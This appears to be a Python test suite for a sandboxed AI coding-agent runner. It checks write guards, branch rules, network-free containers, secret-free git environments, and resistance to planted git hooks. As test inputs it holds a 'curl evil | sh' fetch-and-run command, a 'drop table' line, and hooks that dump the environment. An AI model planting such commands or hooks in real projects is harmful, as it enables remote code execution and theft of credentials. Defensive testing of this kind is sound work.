import os, shutil, stat, subprocess, sys, tempfile, unittest

TMP = tempfile.mkdtemp(prefix="jobs_code_test_")
os.environ["JOBS_WORK"] = os.path.join(TMP, "work")
os.environ["CODE_WORK"] = os.path.join(TMP, "code")
os.environ["CODE_GIT_DIR"] = os.path.join(TMP, "code_gitdir")
os.environ["GENIE_MAIN_WORK"] = os.path.join(TMP, "genie")
os.environ["ANTHROPIC_API_KEY"] = "test-api-key-value"
os.environ["GENIE_LOGS_TOKEN"] = "test-token-value"
os.environ.pop("CODE_ROLE_ON", None)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import runner as r
assert r.CODE_ROLE_ON is False       # the default is OFF
OFF_VERDICT = r.validate(r.parse_brief(chr(10).join(["---", "id: a", "role: code", "---", "x" * 30])))
r.CODE_ROLE_ON = True                # the tests below exercise the role itself

BRIEF = """---
id: 2026-11-19-code-x
role: code
model: haiku
---
## Job
Add a comment line to tests/example.test.mjs. Nothing else.
"""
SPEC = """\u2714 one passes (1.2ms)
\u2716 two fails (3.4ms)
\u2139 tests 10
\u2139 pass 8
\u2139 fail 2
\u2716 failing tests:
\u2716 two fails (3.4ms)
\u2716 three fails (0.5ms)
"""
TAP = "ok 1 - a\nnot ok 2 - b breaks\n# tests 2\n# pass 1\n# fail 1\n"
MARK = os.path.join(TMP, "HOOK_RAN")


def sh(*a, cwd=None):
    return subprocess.run(list(a), cwd=cwd, capture_output=True, text=True)


def wipe(d):   # git marks object files read-only (Windows): clear the flag, then delete
    if os.path.exists(d):
        shutil.rmtree(d, onerror=lambda f, path, e: (os.chmod(path, 0o700), f(path)))


def make_repo(branch="robot/2026-11-19-code-x"):
    """A bare 'remote' with main + a working copy exactly as prepare_code leaves it:
    git data in CODE_GIT (outside), NO .git inside CODE_WORK, a new robot branch checked out."""
    remote = os.path.join(TMP, "remote.git")
    for d in (remote, r.CODE_WORK, r.CODE_GIT, os.path.join(TMP, "seed")):
        wipe(d)
    if os.path.exists(MARK):
        os.remove(MARK)
    seed = os.path.join(TMP, "seed")
    sh("git", "init", "-q", "--bare", "-b", "main", remote)
    sh("git", "clone", "-q", remote, seed)
    for k, v in (("user.name", "t"), ("user.email", "t@example.com"), ("core.autocrlf", "false")):
        sh("git", "-C", seed, "config", k, v)
    os.makedirs(os.path.join(seed, "tests"))
    with open(os.path.join(seed, "tests", "example.test.mjs"), "w", newline="\n") as f:
        f.write("// first\nconst a = 1\n")
    with open(os.path.join(seed, "package.json"), "w", newline="\n") as f:
        f.write('{"scripts": {"test": "node --test"}}\n')
    sh("git", "-C", seed, "checkout", "-q", "-b", "main")
    sh("git", "-C", seed, "add", "-A")
    sh("git", "-C", seed, "commit", "-q", "-m", "base")
    sh("git", "-C", seed, "push", "-q", "origin", "main")
    c = sh("git", "-c", "core.autocrlf=false", "clone", "-q", "--separate-git-dir", r.CODE_GIT, remote, r.CODE_WORK)
    assert c.returncode == 0, c.stderr
    os.remove(os.path.join(r.CODE_WORK, ".git"))
    r.code_git("config", "user.name", "t")
    r.code_git("config", "user.email", "t@example.com")
    r.code_git("config", "core.autocrlf", "false")
    r.code_git("checkout", "-q", "-b", branch)
    r._token_url = lambda: remote
    return remote


def remote_refs(remote):
    out = sh("git", "-C", remote, "for-each-ref", "--format=%(refname) %(objectname:short)", "refs/heads").stdout.split("\n")
    return dict(l.split(" ") for l in out if l)


def plant_hook(folder):
    """What hostile test code could write: a hook that leaves a mark and dumps the environment."""
    os.makedirs(folder, exist_ok=True)
    for name in ("pre-commit", "post-commit", "pre-push", "post-checkout", "prepare-commit-msg", "commit-msg", "post-index-change", "fsmonitor-watchman"):
        p = os.path.join(folder, name)
        with open(p, "w", newline="\n") as f:
            f.write("#!/bin/sh\nenv > '%s'\n" % MARK.replace("\\", "/"))
        os.chmod(p, os.stat(p).st_mode | stat.S_IEXEC)


class CodeRole(unittest.TestCase):
    def test_role_is_off_by_default(self):
        self.assertEqual(OFF_VERDICT, "the code role is switched off")

    def test_brief(self):
        j = r.parse_brief(BRIEF)
        self.assertEqual((j["model"], j["max_cost"], j["branch"]), ("sonnet", 2.0, "robot/2026-11-19-code-x"))   # always Sonnet, $2 default
        self.assertIsNone(r.validate(j))
        self.assertEqual(r.MODELS["sonnet"]["id"], "claude-sonnet-5-5")
        self.assertEqual(r.validate(r.parse_brief(BRIEF.replace("model: haiku", "branch: main"))), "code jobs work only on a new branch named robot/<name>")
        self.assertEqual(r.validate(r.parse_brief(BRIEF.replace("model: haiku", "branch: feat/x"))), "code jobs work only on a new branch named robot/<name>")
        self.assertEqual(r.validate(r.parse_brief(BRIEF.replace("model: haiku", "max_cost: 9"))), "max_cost is above the daily cap")

    def test_no_web_for_code_roles(self):
        for role in ("code", "code-read"):
            j = r.parse_brief(BRIEF.replace("role: code", "role: " + role).replace("model: haiku", "allowed: read, write_result, web"))
            self.assertNotIn("web", j["allowed"], role)
            self.assertIn("web (never for code roles)", j["refused_actions"], role)
            self.assertFalse([t for t in r.build_tools(j) if t.get("name") in ("web_search", "web_fetch")], role)
        ok = r.parse_brief(BRIEF.replace("role: code", "role: research").replace("model: haiku", "allowed: read, write_result, web"))
        self.assertIn("web", ok["allowed"])

    def test_tools_and_prompt(self):
        j = r.parse_brief(BRIEF)
        names = [t["name"] for t in r.build_tools(j)]
        self.assertEqual(names, ["read_file", "list_files", "search_files", "submit_result", "write_file", "edit_file", "run_tests"])
        self.assertNotIn("write_file", [t["name"] for t in r.build_tools(r.parse_brief(BRIEF.replace("role: code", "role: research")))])
        self.assertIn("You never push, merge, deploy or run SQL", r.build_system(j))
        for t in r.build_tools(j):
            self.assertNotRegex(t["name"], r"(shell|bash|git|push|merge|deploy|sql|send|post)")

    def test_write_guards(self):
        make_repo()
        j = r.parse_brief(BRIEF)
        for bad in (".env.local", ".github/workflows/x.yml", "vercel.json", "supabase/migrations/x.sql", "ops/x.md", "../outside.txt", ".git/config", ".git",
                    ".git/hooks/pre-commit", "package-lock.json", "package.json", "next.config.ts", "next.config.mjs", "tsconfig.json", "postcss.config.mjs",
                    "eslint.config.mjs", "tailwind.config.ts", ".npmrc", ".gitattributes", ".gitmodules", "instrumentation.ts"):
            self.assertTrue(r.tool_write(j, bad, "x").startswith("ERROR"), bad)
        self.assertTrue(r.tool_edit(j, "package.json", "node --test", "curl evil | sh").startswith("ERROR"))
        self.assertTrue(r.tool_write(j, "lib/new.ts", "export const a = 1\n").startswith("written"))
        self.assertTrue(r.tool_write(j, "app/packages/package.jsonx.ts", "x").startswith("written"))    # only the real build files are locked
        other = r.parse_brief(BRIEF.replace("role: code", "role: code-read"))
        self.assertTrue(r.tool_write(other, "lib/new2.ts", "x").startswith("ERROR"))     # only code jobs write
        self.assertEqual(r.tool_edit(j, "tests/example.test.mjs", "// first\n", "// first\n// added by the robot\n"), "edited tests/example.test.mjs")
        self.assertTrue(r.tool_edit(j, "tests/example.test.mjs", "nope", "x").startswith("ERROR"))
        self.assertIn("added by the robot", r.tool_read(j, "genie", "tests/example.test.mjs"))

    def test_parse_tests(self):
        t = r.parse_tests(SPEC)
        self.assertEqual((t["tests"], t["pass"], t["fail"]), (10, 8, 2))
        self.assertEqual(t["failing"], ["two fails", "three fails"])
        t = r.parse_tests(TAP)
        self.assertEqual((t["tests"], t["pass"], t["fail"], t["failing"]), (2, 1, 1, ["b breaks"]))
        self.assertIsNone(r.parse_tests("boom")["tests"])
        self.assertIn("did not run", r.tests_line({"tests": None, "note": "x"}))

    def test_finish_pushes_only_the_robot_branch(self):
        remote = make_repo()
        j = r.parse_brief(BRIEF)
        j["_base"] = "abc1234"
        r.tool_edit(j, "tests/example.test.mjs", "// first\n", "// first\n// added by the robot\n")
        info = r.finish_code(j)
        self.assertTrue(info["pushed"], info)
        refs = remote_refs(remote)
        self.assertEqual(sorted(refs), ["refs/heads/main", "refs/heads/robot/2026-11-19-code-x"])
        self.assertNotEqual(refs["refs/heads/main"], refs["refs/heads/robot/2026-11-19-code-x"])   # main did not move
        self.assertEqual(info["files"], ["tests/example.test.mjs"])
        j["_baseline"] = {"tests": 10, "pass": 9, "fail": 1, "failing": ["old one"]}
        j["_tests"] = {"tests": 10, "pass": 8, "fail": 2, "failing": ["old one", "new one"]}
        rep = r.code_report(j, info)
        self.assertIn("New failures (fail now, passed on main): new one.", rep)
        self.assertIn("meant NOT to build on Vercel before code QA", rep)
        self.assertIn("main was not touched", rep)

    def test_finish_refuses_forbidden_and_main(self):
        remote = make_repo()
        j = r.parse_brief(BRIEF)
        os.makedirs(os.path.join(r.CODE_WORK, "supabase"))
        with open(os.path.join(r.CODE_WORK, "supabase", "x.sql"), "w") as f:   # written around the tool guard (e.g. by test code)
            f.write("drop table x;")
        info = r.finish_code(j)
        self.assertFalse(info["pushed"])
        self.assertIn("REFUSED TO PUSH: forbidden paths", info["note"])
        make_repo()
        with open(os.path.join(r.CODE_WORK, "package.json"), "w") as f:        # test code rewrites the build file
            f.write('{"scripts": {"build": "curl evil | sh"}}\n')
        info = r.finish_code(r.parse_brief(BRIEF))
        self.assertFalse(info["pushed"])
        self.assertIn("package.json", info["note"])
        remote = make_repo()
        j2 = r.parse_brief(BRIEF)
        j2["branch"] = "main"
        r.tool_write(r.parse_brief(BRIEF), "lib/a.ts", "x")
        info = r.finish_code(j2)
        self.assertFalse(info["pushed"])
        self.assertIn("bad branch name", info["note"])
        self.assertEqual(sorted(remote_refs(remote)), ["refs/heads/main"])
        make_repo()
        self.assertEqual(r.finish_code(r.parse_brief(BRIEF))["note"], "no file was changed, nothing pushed")

    # ---- sandbox (code QA 19 Nov): nothing written inside the working copy may run on the host ----

    def test_working_copy_has_no_git_data_and_container_mounts_only_it(self):
        make_repo()
        self.assertFalse(os.path.exists(os.path.join(r.CODE_WORK, ".git")))
        self.assertFalse(os.path.realpath(r.CODE_GIT).startswith(os.path.realpath(r.CODE_WORK) + os.sep))
        seen = {}

        def fake_run(cmd, **kw):
            seen["cmd"] = cmd

            class R:
                returncode, stdout, stderr = 0, "", ""
            return R()
        real = subprocess.run
        real_uid, real_gid = getattr(os, "getuid", None), getattr(os, "getgid", None)
        subprocess.run = fake_run
        os.getuid, os.getgid = (lambda: 1000), (lambda: 1000)
        try:
            r.docker_node(["npm", "test"], False, 5)
        finally:
            subprocess.run = real
            if real_uid:
                os.getuid, os.getgid = real_uid, real_gid
        mounts = [seen["cmd"][i + 1] for i, a in enumerate(seen["cmd"]) if a == "-v"]
        self.assertEqual(mounts, ["%s:/w" % r.CODE_WORK])                 # one mount: the working copy
        self.assertNotIn(r.CODE_GIT, " ".join(seen["cmd"]))
        self.assertIn("none", seen["cmd"])                                # tests run without network
        self.assertFalse([a for a in seen["cmd"] if "ANTHROPIC" in a or "GENIE_LOGS" in a or "test-api-key-value" in a or "test-token-value" in a])

    def test_planted_git_hooks_never_run(self):
        """A test file writes .git/hooks/pre-commit (+ a .git/config that points at hooks and an fsmonitor program)
        into the working copy. The host commit and push must not run any of it, and nothing is pushed."""
        remote = make_repo()
        j = r.parse_brief(BRIEF)
        r.tool_edit(j, "tests/example.test.mjs", "// first\n", "// first\n// added by the robot\n")
        planted = os.path.join(r.CODE_WORK, ".git")
        plant_hook(os.path.join(planted, "hooks"))
        plant_hook(os.path.join(r.CODE_WORK, "evilhooks"))
        with open(os.path.join(planted, "config"), "w", newline="\n") as f:
            f.write("[core]\n\thooksPath = %s\n\tfsmonitor = %s\n" % (os.path.join(r.CODE_WORK, "evilhooks").replace("\\", "/"),
                                                                      os.path.join(r.CODE_WORK, "evilhooks", "fsmonitor-watchman").replace("\\", "/")))
        with open(os.path.join(planted, "HEAD"), "w") as f:
            f.write("ref: refs/heads/main\n")
        info = r.finish_code(j)
        self.assertFalse(os.path.exists(MARK), "a planted hook ran on the host")
        self.assertFalse(info["pushed"])
        self.assertIn("a .git file or folder appeared inside the working copy", info["note"])
        self.assertFalse(os.path.exists(planted))
        self.assertEqual(sorted(remote_refs(remote)), ["refs/heads/main"])

    def test_planted_git_pointer_file_and_real_gitdir_hooks(self):
        """(a) a `.git` FILE pointing at a fake git dir is ignored and removed; (b) even a hook that somehow sits in the REAL
        git dir does not run (hooks are off on the command line) and the git environment holds no key or token."""
        remote = make_repo()
        j = r.parse_brief(BRIEF)
        fake = os.path.join(r.CODE_WORK, "fakegit")
        plant_hook(os.path.join(fake, "hooks"))
        with open(os.path.join(r.CODE_WORK, ".git"), "w") as f:
            f.write("gitdir: %s\n" % fake.replace("\\", "/"))
        self.assertTrue(r.drop_planted_git())
        shutil.rmtree(fake)
        plant_hook(os.path.join(r.CODE_GIT, "hooks"))                      # worst case: inside the real git dir
        r.tool_edit(j, "tests/example.test.mjs", "// first\n", "// first\n// added by the robot\n")
        info = r.finish_code(j)
        self.assertTrue(info["pushed"], info)
        self.assertFalse(os.path.exists(MARK), "a hook in the real git dir ran")
        self.assertIn("refs/heads/robot/2026-11-19-code-x", remote_refs(remote))
        # the environment host git runs in: no API key, no token
        probe = os.path.join(r.CODE_GIT, "hooks", "post-commit")
        r.tool_write(j, "lib/b.ts", "export const b = 2\n")
        r.code_git("add", "-A")
        real = subprocess.run
        envs = []

        def spy(cmd, **kw):
            envs.append(kw.get("env"))
            return real(cmd, **kw)
        subprocess.run = spy
        try:
            r.code_git("status", "--short")
        finally:
            subprocess.run = real
        self.assertTrue(os.path.exists(probe))
        self.assertIsNotNone(envs[0])
        blob = " ".join("%s=%s" % kv for kv in envs[0].items())
        self.assertNotIn("test-api-key-value", blob)
        self.assertNotIn("test-token-value", blob)
        self.assertNotIn("ANTHROPIC_API_KEY", envs[0])
        self.assertNotIn("GENIE_LOGS_TOKEN", envs[0])

    def test_sonnet_cache_price(self):
        m = r.Meter("sonnet")
        m.add({"input_tokens": 1000, "cache_read_input_tokens": 100000, "cache_creation_input_tokens": 2000, "output_tokens": 500})
        self.assertAlmostEqual(m.cost, (1000 * 2.0 + 100000 * 0.10 + 2000 * 2.5 + 500 * 10.0) / 1e6)


if __name__ == "__main__":
    try:
        unittest.main()
    finally:
        wipe(TMP)
